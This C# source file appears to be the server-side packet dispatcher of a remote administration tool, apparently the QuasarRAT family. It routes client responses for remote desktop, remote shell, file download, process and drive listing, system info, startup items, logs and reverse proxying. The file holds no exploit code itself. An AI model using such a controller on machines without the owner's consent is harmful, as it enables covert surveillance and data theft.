using xServer.Core.Commands;
using xServer.Core.ReverseProxy;

namespace xServer.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!client.Value.IsAuthenticated)
            {
                if (type == typeof(ClientPackets.Initialize))
                    CommandHandler.HandleInitialize(client, (ClientPackets.Initialize)packet);
                else
                    return;
            }

            if (type == typeof(ClientPackets.Status))
            {
                CommandHandler.HandleStatus(client, (ClientPackets.Status)packet);
            }
            else if (type == typeof(ClientPackets.UserStatus))
            {
                CommandHandler.HandleUserStatus(client, (ClientPackets.UserStatus)packet);
            }
            else if (type == typeof(ClientPackets.DesktopResponse))
            {
                CommandHandler.HandleRemoteDesktopResponse(client, (ClientPackets.DesktopResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client,
                    (ClientPackets.GetProcessesResponse)packet);
            }
            else if (type == typeof(ClientPackets.DrivesResponse))
            {
                CommandHandler.HandleDrivesResponse(client, (ClientPackets.DrivesResponse)packet);
            }
            else if (type == typeof(ClientPackets.DirectoryResponse))
            {
                CommandHandler.HandleDirectoryResponse(client, (ClientPackets.DirectoryResponse)packet);
            }
            else if (type == typeof(ClientPackets.DownloadFileResponse))
            {
                CommandHandler.HandleDownloadFileResponse(client,
                    (ClientPackets.DownloadFileResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client,
                    (ClientPackets.GetSystemInfoResponse)packet);
            }
            else if (type == typeof(ClientPackets.MonitorsResponse))
            {
                CommandHandler.HandleMonitorsResponse(client, (ClientPackets.MonitorsResponse)packet);
            }
            else if (type == typeof(ClientPackets.ShellCommandResponse))
            {
                CommandHandler.HandleShellCommandResponse(client,
                    (ClientPackets.ShellCommandResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetStartupItemsResponse))
            {
                CommandHandler.HandleGetStartupItemsResponse(client,
                    (ClientPackets.GetStartupItemsResponse)packet);
            }
            else if (type == typeof(ClientPackets.GetLogsResponse))
            {
                CommandHandler.HandleGetLogsResponse(client, (ClientPackets.GetLogsResponse)packet);
            }
            else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                    type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                    type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
